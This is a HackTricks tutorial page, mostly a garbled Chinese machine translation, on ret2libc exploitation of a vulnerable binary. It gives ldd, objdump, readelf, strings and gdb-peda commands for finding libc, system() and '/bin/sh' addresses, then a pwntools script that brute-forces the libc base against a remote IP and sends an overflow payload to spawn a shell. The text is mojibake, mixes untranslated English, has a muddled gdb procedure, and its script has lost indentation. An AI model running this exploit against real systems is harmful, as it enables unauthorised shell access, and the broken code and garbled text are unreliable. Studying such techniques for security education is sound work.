<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


**å¦‚æœä½ æ‰¾åˆ°äº†ä¸€ä¸ªæœ‰æ¼æ´çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶ä¸”è®¤ä¸ºå¯ä»¥ä½¿ç”¨Ret2Libæ¥åˆ©ç”¨å®ƒï¼Œè¿™é‡Œæœ‰ä¸€äº›åŸºæœ¬æ­¥éª¤ä¾›ä½ å‚è€ƒã€‚**

# å¦‚æœä½ åœ¨**ä¸»æœºå†…éƒ¨**

## ä½ å¯ä»¥æ‰¾åˆ°**libcçš„åœ°å€**
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
å¦‚æœä½ æƒ³æ£€æŸ¥ASLRæ˜¯å¦æ”¹å˜äº†libcçš„åœ°å€ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```bash
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```
## è·å–systemå‡½æ•°çš„åç§»é‡

To exploit a binary using a ret2libc attack, we need to find the offset of the `system` function in the target binary. This offset will help us calculate the address of the `system` function in memory.

ä¸ºäº†åˆ©ç”¨ret2libcæ”»å‡»æ¥åˆ©ç”¨ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ä¸­`system`å‡½æ•°çš„åç§»é‡ã€‚è¿™ä¸ªåç§»é‡å°†å¸®åŠ©æˆ‘ä»¬è®¡ç®—å†…å­˜ä¸­`system`å‡½æ•°çš„åœ°å€ã€‚

To find the offset, we can use a tool like `objdump` or `readelf` to analyze the target binary. We need to search for the symbol table entry of the `system` function and note down its offset.

ä¸ºäº†æ‰¾åˆ°åç§»é‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`objdump`æˆ–`readelf`ç­‰å·¥å…·æ¥åˆ†æç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æˆ‘ä»¬éœ€è¦æœç´¢`system`å‡½æ•°çš„ç¬¦å·è¡¨é¡¹ï¼Œå¹¶è®°å½•ä¸‹å®ƒçš„åç§»é‡ã€‚

For example, using `objdump`, we can run the following command:

ä¾‹å¦‚ï¼Œä½¿ç”¨`objdump`ï¼Œæˆ‘ä»¬å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```bash
objdump -T <binary> | grep system
```

This command will display the symbol table entries containing the word "system". We need to look for the entry that corresponds to the `system` function and note down its offset.

è¿™ä¸ªå‘½ä»¤å°†æ˜¾ç¤ºåŒ…å«å•è¯"system"çš„ç¬¦å·è¡¨é¡¹ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°å¯¹åº”äº`system`å‡½æ•°çš„æ¡ç›®ï¼Œå¹¶è®°å½•ä¸‹å®ƒçš„åç§»é‡ã€‚

Once we have the offset, we can calculate the address of the `system` function by adding the offset to the base address of the loaded binary in memory.

ä¸€æ—¦æˆ‘ä»¬æœ‰äº†åç§»é‡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†åç§»é‡åŠ ä¸Šå†…å­˜ä¸­åŠ è½½çš„äºŒè¿›åˆ¶æ–‡ä»¶çš„åŸºåœ°å€æ¥è®¡ç®—`system`å‡½æ•°çš„åœ°å€ã€‚

Note: The offset may vary depending on the version of the target binary and the system it is running on. So, it is important to find the offset specific to the target binary and system.

æ³¨æ„ï¼šåç§»é‡å¯èƒ½ä¼šå› ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶çš„ç‰ˆæœ¬å’Œè¿è¡Œç³»ç»Ÿè€Œæœ‰æ‰€ä¸åŒã€‚å› æ­¤ï¼Œæ‰¾åˆ°ç‰¹å®šäºç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶å’Œç³»ç»Ÿçš„åç§»é‡éå¸¸é‡è¦ã€‚
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
## è·å– "/bin/sh" çš„åç§»é‡

To exploit a binary using a ret2lib technique, we need to find the offset of the string "/bin/sh" in the binary's memory. This string is commonly used as an argument for functions like `system()` or `execve()` to execute commands in a shell.

To find the offset, we can use a tool like `gdb` to debug the binary. Here are the steps to follow:

1. Open the binary in `gdb` by running the command `gdb <binary_name>`.
2. Set a breakpoint at a function that uses the string "/bin/sh". For example, you can set a breakpoint at the `system()` function by running the command `break system`.
3. Start the execution of the binary by running the command `run`.
4. Once the breakpoint is hit, use the command `x/s <address>` to examine the memory at a specific address. Replace `<address>` with the address where the string "/bin/sh" is stored. For example, if the address is `0x804a030`, you can run the command `x/s 0x804a030`.
5. The output of the command will display the string "/bin/sh" along with its memory address. Note down the memory address.

By following these steps, you can determine the offset of the string "/bin/sh" in the binary's memory. This offset will be useful when crafting the payload for the ret2lib exploit.
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
## /proc/\<PID>/maps

å¦‚æœè¿›ç¨‹æ¯æ¬¡ä¸å…¶äº¤äº’æ—¶éƒ½ä¼šåˆ›å»ºå­è¿›ç¨‹ï¼ˆç½‘ç»œæœåŠ¡å™¨ï¼‰ï¼Œå°è¯•è¯»å–è¯¥æ–‡ä»¶ï¼ˆå¯èƒ½éœ€è¦ä»¥rootèº«ä»½ï¼‰ã€‚

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°libcåœ¨è¿›ç¨‹ä¸­çš„åŠ è½½ä½ç½®ä»¥åŠæ¯ä¸ªå­è¿›ç¨‹å°†è¦åŠ è½½çš„ä½ç½®ã€‚

![](<../../.gitbook/assets/image (95).png>)

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒåŠ è½½åœ¨**0xb75dc000**ï¼ˆè¿™å°†æ˜¯libcçš„åŸºåœ°å€ï¼‰

## ä½¿ç”¨gdb-peda

ä½¿ç”¨gdb-pedaè·å–**system**å‡½æ•°ã€**exit**å‡½æ•°å’Œå­—ç¬¦ä¸²**"/bin/sh"**çš„åœ°å€ï¼š
```
p system
p exit
find "/bin/sh"
```
# ç»•è¿‡ASLR

ä½ å¯ä»¥å°è¯•æš´åŠ›ç ´è§£libcçš„åŸºå€ã€‚
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
# ä»£ç 
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive() #?
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ–è€… [**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
